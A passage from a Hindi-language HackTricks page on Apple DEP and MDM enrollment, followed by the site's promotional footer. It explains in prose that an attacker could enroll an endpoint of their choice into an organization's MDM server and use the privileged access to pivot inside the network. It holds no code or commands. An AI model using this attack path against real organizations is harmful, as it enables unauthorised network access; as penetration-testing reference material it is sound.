हालांकि, जब एमडीएम नामांकन को बूटस्ट्रैप करने के लिए डीईपी का उपयोग करते हैं, तो यह एक समस्या प्रस्तुत करता है, क्योंकि एक हमलावर संगठन के एमडीएम सर्वर में अपनी पसंद के किसी भी एंडपॉइंट को नामांकित करने में सक्षम होगा। इसके अलावा, एक बार जब एक हमलावर सफलतापूर्वक एमडीएम में अपनी पसंद के एंडपॉइंट को नामांकित कर लेता है, तो वे विशेषाधिकार प्राप्त पहुंच प्राप्त कर सकते हैं जिसका उपयोग नेटवर्क के भीतर आगे पिवट करने के लिए किया जा सकता है।

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) या **Twitter** पर मुझे **फॉलो** करें 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें।

</details>
